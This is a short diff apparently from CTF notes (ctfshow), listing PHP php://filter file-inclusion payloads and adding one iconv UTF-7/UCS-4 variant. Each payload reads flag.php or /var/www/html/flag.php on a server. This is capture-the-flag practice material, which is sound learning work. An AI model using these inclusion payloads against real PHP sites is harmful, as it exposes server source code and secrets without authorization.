@@ -25,6 +25,7 @@ php://filter/ctfshow/resource=flag.php
 file=php://filter/resource=flag.php
 php://filter/ctfshow/resource=flag.php
 file=php://filter/read=convert.quoted-printable-encode/resource=/var/www/html/flag.php
+?filename=php://filter/convert.iconv.UTF-7.UCS-4*/resource=flag.php
 
 
 UCS-2BE编码：
